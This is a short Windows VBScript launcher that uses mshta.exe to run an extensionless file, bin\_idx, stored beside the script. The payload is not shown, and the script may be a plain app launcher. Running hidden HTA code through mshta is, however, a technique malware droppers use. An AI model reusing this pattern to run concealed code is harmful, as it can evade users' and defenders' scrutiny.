Set oShell = CreateObject("Wscript.Shell") 
strWinDir = oShell.ExpandEnvironmentStrings("%SYSTEMROOT%")
Sub Run(ByVal sFile,sAttr)

Dim shell

   Set shell = CreateObject("WScript.Shell")

   shell.Run Chr(34) & sFile & Chr(34) & sAttr, 1, false

   Set shell = Nothing

End Sub
Set fso = CreateObject("Scripting.FileSystemObject") 
   myPath = fso.GetParentFolderName(wscript.ScriptFullName) 
Run strWindir & "\System32\mshta.exe", myPath & "\bin\_idx"